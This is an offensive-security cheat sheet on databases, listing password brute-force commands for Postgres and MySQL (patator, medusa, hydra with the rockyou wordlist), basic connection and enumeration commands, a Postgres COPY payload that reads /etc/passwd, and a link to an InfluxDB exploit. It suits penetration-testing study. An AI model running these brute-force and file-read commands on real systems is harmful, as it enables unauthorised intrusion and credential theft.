# 🗄️ Database

---

- [Dynamodb](#dynamodb)
- [Influx DB](#influx-db)
- [Mysql](#mysql)
- [Postgres](#postgres)
- [SQLite](#sqlite)

# Bruteforce
### Patator
```bash
patator pgsql_login user=user password=FILE1 0=/usr/share/wordlists/rockyou.txt  host=ip -x ignore:fgrep='failed'
```

### Medusa
```bash
medusa -h ip -u user -P pass.txt -M mysql -n 22
```

### Hydra
```bash
hydra -l user -P pass.txt ip mysql
```

# MySql
> Port: 3306

### Connect to mysql
```bash
mysql -h localhost -u myname -p
```

### Show Info
```
SHOW DATABASES;
use db_name
SHOW TABLES;
```

### Select
```sql
SELECT * FROM table_name
```

# SQLite
### Open
```bash
sqlite3 database.sqlite3
```
or open in vs code

### Show info
```
.databases
.tables
```

# Postgres
> Port: 5432

### Wordlist Default Credentials
```path
/usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt
/usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt
```

### Connect
```bash
psql -h ip -U username -d database -W
```

### Show infos
```
\l # list all databases
\dt # list all tables
```

### Read File
```sql
create table hack(file TEXT);
COPY hack FROM '/etc/passwd';
select * from hack;
```

- [PostgreSQL Pentesting](https://medium.com/@lordhorcrux_/ultimate-guide-postgresql-pentesting-989055d5551e)

# Influx DB

[CVE-2019-20933 Influxdb](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)

```
> show databases # to display databases
> show field keys # field keys (like columns in sql)
> show measurements # to display measurements (like tables in sql)
{
  ...
  "results": [
    "values": [
        [
            <strong>"foo"</strong>
        ]
    ]
  ...
}
> select * from "foo" # display all content of measurments (table) 'foo' (keep the doubles quotes)
```

# Dynamodb

See [this page](../wiki/Cloud.md)